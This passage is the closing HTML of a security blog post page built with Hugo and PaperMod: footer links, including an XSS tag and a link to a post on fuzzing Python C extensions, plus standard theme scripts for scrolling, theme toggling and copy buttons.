href=https://stulle123.github.io/tags/xss/>XSS</a></li></ul><nav class=paginav><a class=prev href=https://stulle123.github.io/posts/fuzzing-python-extensions/whitebox/><span class=title>¬´ Prev</span><br><span>Whitebox fuzzing Python C Extensions</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://stulle123.github.io/>stulle123's Blog</a></span> ¬∑
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>